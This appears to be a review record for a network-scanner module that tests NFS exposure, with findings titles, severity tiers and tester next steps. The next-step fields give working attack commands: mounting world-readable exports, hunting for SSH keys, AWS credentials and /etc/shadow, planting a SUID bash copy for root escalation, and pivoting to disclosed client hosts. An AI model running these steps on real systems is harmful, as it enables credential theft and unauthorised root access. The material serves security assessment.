summary: Strong module: portmapper DUMP + MOUNTPROC_EXPORT + MOUNTPROC_MNT (which returns a real root filehandle from recce's IP). MNT is T2-grade proof-of-mountability but the module stops short of AUTH_SYS UID spoofing or NFSv3 READDIR/GETATTR walk-through that would turn the filehandle into pulled data (T3).

findings.title_pattern: NFS export shared to any host (world-mountable)
findings.tier_evidence: showmount -e groups=* is a deterministic vuln signal: the export ACL is objectively 'any host'. No exploit sent.
findings.promotion_notes: After MOUNTPROC_MNT success, walk NFSv3 GETATTR/READDIR on the returned root filehandle and record file list (etc/shadow, id_rsa, .bash_history). That is T3 actual loot pull, not just proof.
findings.tester_next_step: mkdir -p /mnt/nfs && mount -t nfs -o vers=3,nolock IP:/<export> /mnt/nfs && ls -laR /mnt/nfs | head -200; look for id_rsa, .aws/credentials, /etc/shadow. If no_root_squash: cp /bin/bash /mnt/nfs/.bash && chmod +s /mnt/nfs/.bash for SUID escalation.

findings.tier_evidence: Directory-listing recon only; no exposure claim beyond information disclosure.
findings.promotion_notes: Already correct: showmount -e without creds is just enum.
findings.tester_next_step: showmount -e IP  # if any 'Everyone' or '*' rows appear, mount them per nfs_world guidance

findings.promotion_notes: Portmapper listing is not itself a vuln; keep at T0.
findings.tester_next_step: rpcinfo -p IP  # note nfs/mountd/nlockmgr; feed mountd port to showmount

findings.title_pattern: NFS mountd granted a filehandle (mount succeeded from recce)
findings.tier_evidence: MOUNTPROC_MNT MNT3_OK returns a real 32-byte root filehandle to recce's own IP: this is a controlled probe that succeeds ONLY if the export is mountable by an attacker, and captures a genuine primitive (the filehandle). Non-destructive.
findings.promotion_notes: Send NFSv3 GETATTR/READDIRPLUS on the returned filehandle to prove data read; on no_root_squash, WRITE (LINK/CREATE) a SUID payload. Requires new nfs3 XDR client, but purely additive read-only walk is safe.
findings.tester_next_step: mount -o vers=3,nolock,soft IP:/<export> /mnt/x; find /mnt/x -maxdepth 3 -name id_rsa -o -name authorized_keys -o -name shadow 2>/dev/null; stat /mnt/x/etc  # if uid 0 = root_squash off

findings.title_pattern: NFS mountd disclosed the client mount list (showmount -a)
findings.tier_evidence: MOUNTPROC_DUMP client list is neighbour recon, not an exposure of the exports.
findings.promotion_notes: Feed the disclosed hostnames into known_hosts/relay_targets; module already claims this pattern.
findings.tester_next_step: showmount -a IP  # each 'client:/export' pair is a lateral pivot target — resolve hosts and rescan those subnets
